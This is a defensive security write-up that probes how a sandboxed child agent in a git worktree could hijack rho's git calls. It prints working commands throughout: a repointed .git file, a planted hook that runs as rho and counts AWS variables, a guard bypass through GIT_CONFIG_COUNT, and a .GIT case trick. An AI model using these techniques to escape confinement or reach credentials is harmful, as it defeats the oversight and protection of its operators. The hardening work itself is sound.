# Verification — the worktree `.git` attack, probed for real

Date: 2026-08-20. A step-9 security review rated this critical, and AGENTS.md says a severity
is a hypothesis. So it was probed. Every command and every output below is real. No rho code
was involved, because the target is git's own behaviour and the contract that must survive it.

## The hypothesis

A git worktree holds a `.git` **file**, not a directory, and that file names the
administrative directory. The file sits inside the child's own session root, so `confine`
allows the child to write it. `confine` has no concept of `.git`. So a child can point its own
`.git` at a repository it controls, and rho then runs git against that repository.

## The setup

```sh
mkdir -p /tmp/wt-probe/repo && cd /tmp/wt-probe/repo
git init -q . && git config user.email t@t && git config user.name t
echo one > a.txt && git add a.txt && git commit -qm first
git worktree add -q ../child -b probe-branch
cd ../child && cat .git
# gitdir: /private/tmp/wt-probe/repo/.git/worktrees/child
```

## The attack

The child creates a repository it owns, plants a hook, and repoints its own `.git`.

```sh
git init -q .evil
cd .evil && git config user.email t@t && git config user.name t
printf '#!/bin/sh\nid > /tmp/wt-probe/PWNED\nenv | grep -c AWS >> /tmp/wt-probe/PWNED\n' \
  > .git/hooks/post-commit
chmod +x .git/hooks/post-commit
cd .. && echo "gitdir: /tmp/wt-probe/child/.evil/.git" > .git
```

rho then runs its ordinary reclaim commands in the child root:

```sh
git add -A . && git commit -qm "rho commits the child work"
cat /tmp/wt-probe/PWNED
```

Real output:

```text
uid=501(le) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),...
4
```

```sh
git rev-parse --git-dir
# /private/tmp/wt-probe/child/.evil/.git
cd /tmp/wt-probe/repo && git log --oneline probe-branch
# 940cb49 first
```

## What the probe proves

1. **Code execution as rho.** The child's `post-commit` hook ran as the rho user.
2. **Credential reach.** `env | grep -c AWS` printed `4`, so four AWS variables were visible to
   the child's hook. This is the defect decision D-bash-scrubs-credentials already fixed for
   `bash`, reached again through git.
3. **A lying report, and lost work.** The commit landed in the child's own repository, and
   `probe-branch` still held only `first`. rho would have reported a branch that holds nothing.

The third point was not in the review. The probe found it.

## The mitigations, also probed

Hooks off:

```sh
git -c core.hooksPath=/dev/null commit -qm "with hooks off" --allow-empty
# no hook ran
```

The recorded administrative directory, passed explicitly:

```sh
ADMIN=/tmp/wt-probe/repo/.git/worktrees/child
git --git-dir="$ADMIN" --work-tree=/tmp/wt-probe/child -c core.hooksPath=/dev/null \
    -c user.email=t@t -c user.name=rho add -A .
git --git-dir="$ADMIN" --work-tree=/tmp/wt-probe/child -c core.hooksPath=/dev/null \
    -c user.email=t@t -c user.name=rho commit -qm "kept by rho"
cd /tmp/wt-probe/repo && git log --oneline probe-branch
# c70e553 kept by rho
# 940cb49 first
```

No hook ran, and the commit landed on the real branch. Both mitigations work.

## A fourth finding, from the same run

The `add -A` step printed this:

```text
warning: adding embedded git repository: .evil
```

git records a nested repository as a gitlink, so its content is **not** kept. A child that
creates any repository inside its worktree loses that content silently. The contract now
requires reclaim to find every nested `.git` and name it in the report.

## What this changed in the contract

`SPEC-subagent-worktree-isolation` section 4a now states four rules for every git call: hooks
off, an explicit recorded git directory, a scrubbed environment, and an explicit committer
identity. See decision D-a-workspace-hardens-every-git-call.

## Round two: the gate, the environment form, and the case rule

Date: 2026-08-20, after a third review pass. A reviewer found that the gate hardening named a
value the gate cannot reach, and it raised two questions about the mechanism. Both were probed,
plus a filesystem question the reviewer asked about. Every output below is real.

### A hook still runs when nothing guards the call

```sh
git worktree add -q ../wt -b probe2 && cd ../wt
printf '#!/bin/sh\necho HOOK_RAN >> /tmp/gate-probe/HOOK\n' > .evilhooks/pre-commit
chmod +x .evilhooks/pre-commit && git config core.hooksPath "$PWD/.evilhooks"
git add b.txt && git commit -qm second
cat /tmp/gate-probe/HOOK
# HOOK_RAN
```

### The environment form works, and it reaches a git that rho never names

A gate check is a shell string, so rho cannot add a flag to a git call inside it. The
`GIT_CONFIG_*` form is the answer, and it survives a nested shell:

```sh
env GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.hooksPath GIT_CONFIG_VALUE_0=/dev/null \
  sh -c 'git add c.txt && git commit -qm third; git config --show-origin core.hooksPath'
# command line:	/dev/null
# (no hook ran, even through the nested shell)
```

### `GIT_DIR` holds across a directory change, and beats `git -C`

```sh
cd /tmp/gate-probe/wt/sub
env GIT_DIR=$ADMIN GIT_WORK_TREE=/tmp/gate-probe/wt git status --porcelain   # ok
env GIT_DIR=$ADMIN GIT_WORK_TREE=/tmp/gate-probe/wt git -C /tmp rev-parse --git-dir
# /tmp/gate-probe/repo/.git/worktrees/wt
```

### `.GIT` is `.git` on this filesystem

```sh
mkdir .git && echo real > .git/config
echo pwned > .GIT/config
cat .git/config
# pwned
```

So a case-sensitive component check for `.git` is evaded by one keystroke. The contract now says
the match is ASCII case-insensitive.

### What this changed in the contract

`GateContext` gains `isolated_git: Option<GitEnv>`, filled by the spawn wiring from `Isolated`.
`SandboxedRunner` applies the environment. The recorded administrative directory is never
re-derived from the worktree `.git` file, because that file is the attack. That amends a contract
`SPEC-agent-tasks` owns, so this spec states the amendment rather than assuming it.

## Round three: two limits of the environment form

Date: 2026-08-20, after a fourth review pass. Both claims below were probed by a reviewer and then
re-run by the controller, because AGENTS.md says to verify rather than trust a report.

### A nested tool that renumbers `GIT_CONFIG_COUNT` defeats the guard

```sh
git config core.hooksPath "$PWD/evilhooks"     # the repository config, outside the worktree
env GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.hooksPath GIT_CONFIG_VALUE_0=/dev/null \
  sh -c 'export GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=user.name GIT_CONFIG_VALUE_0=tool
         git add b.txt; git commit -qm second; git config --show-origin core.hooksPath'
# file:.git/config	/tmp/p4/repo/evilhooks
cat /tmp/p4/FIRED
# HOOK_FIRED
```

The nested tool reused index zero, so rho's guard was overwritten and the hook ran. The guard is
therefore best-effort. The contract now says so, and it adds two stronger steps that do not depend
on the environment.

### A forced `GIT_DIR` redirects a nested git in another repository

```sh
cd /tmp/p4/vendored && git describe --tags
# v1.0
env GIT_DIR=/tmp/p4/repo/.git GIT_WORK_TREE=/tmp/p4/repo git describe --tags
# fatal: No names found, cannot describe anything.
env GIT_DIR=/tmp/p4/repo/.git GIT_WORK_TREE=/tmp/p4/repo git rev-parse --git-dir
# /tmp/p4/repo/.git
```

So a gate check that runs a build whose script asks git about a vendored dependency would read
rho's repository instead. The contract no longer forces `GIT_DIR` on a check. It repairs the
worktree pointer before the gate instead, which is safe because the child has already stopped.
